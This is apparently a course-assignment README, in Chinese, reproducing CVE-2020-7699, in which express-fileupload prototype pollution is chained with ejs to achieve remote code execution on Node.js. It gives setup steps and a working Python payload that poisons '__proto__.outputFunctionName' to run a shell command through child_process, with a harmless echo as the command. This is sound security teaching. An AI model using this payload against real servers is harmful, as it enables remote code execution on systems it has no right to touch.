# CVE-2020-7699 漏洞复现

针对 Node.js 远程代码执行漏洞 CVE-2020-7699 的复现，软件安全原理课程大作业

## 环境部署

Node.js 版本：`v14.16.1`，请尽量保证 Node.js 版本号为 14

Python 版本：`3.9.5`，Python 仅用于发起 HTTP 攻击请求，版本任意即可

`clone` 该仓库，使用 `npm i` 安装所需依赖。项目提供了两条预设指令：

* 使用 `npm run start-server` 启动目标服务器
* 使用 `npm run launch-attack` 演示攻击

## 漏洞原理分析

express-fileUpload：低于 1.1.10 的版本均会受到影响

### express-fileUpload 中存在原型链污染

漏洞原理：[express-fileUpload prototype pollution](https://blog.p6.is/Real-World-JS-1/)

漏洞利用：通过污染 `__proto__.outputFunctionName`，将其写入希望执行的代码，从而进一步利用 ejs 远程代码执行漏洞。例如这里通过 Node.js 创建子进程执行了命令 `echo "ATTACK SUCCESSFUL" > attacked.txt`

```python
exec_command = "echo \"ATTACK SUCCESSFUL\" > attacked.txt"

{
    "__proto__.outputFunctionName": (
        None,
        f"x;process.mainModule.require('child_process').exec('{exec_command}');x"
    )
}
```

### ejs 存在远程代码执行漏洞

漏洞原理：ejs 逻辑中会运行 `xxx.outputFunctionName`，但该对象的该属性应该是 undefined。如果 `object` 的该方法被污染，就会导致意外的执行
